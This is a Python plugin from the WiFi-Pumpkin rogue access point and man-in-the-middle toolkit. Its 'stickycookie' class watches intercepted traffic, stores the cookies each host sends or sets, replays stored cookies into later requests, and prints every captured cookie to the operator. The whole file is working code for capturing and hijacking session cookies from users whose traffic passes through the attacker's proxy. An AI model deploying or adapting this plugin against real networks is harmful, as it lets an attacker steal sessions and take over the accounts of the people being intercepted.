from mitmproxy.models import decoded
from plugins.extension.plugin import PluginTemplate

"""
Description:
    This program is a core for wifi-pumpkin.py. file which includes functionality
    plugins for Pumpkin-Proxy.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

class stickycookie(PluginTemplate):
    meta = {
        'Name'      : 'stickycookie',
        'Version'   : '1.0',
        'Description' : 'Traffic is monitored for Cookie and Set-Cookie headers',
        'Author'    : 'from mitmproxy scripts'
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.stickyhosts = {}
        self.ConfigParser = False
    def request(self, flow):
        try:
            hid = (flow.request.host, flow.request.port)
            if "cookie" in flow.request.headers:
                self.stickyhosts[hid] = flow.request.headers.get_all("cookie")
            elif hid in self.stickyhosts:
                flow.request.headers.set_all("cookie", self.stickyhosts[hid])
            self.send_output.emit("Host: {} Captured cookie: {} ".format(hid, self.stickyhosts[hid]))
        except: pass

    def response(self, flow):
        hid = (flow.request.host, flow.request.port)
        if "set-cookie" in flow.response.headers:
            self.stickyhosts[hid] = flow.response.headers.get_all("set-cookie")
            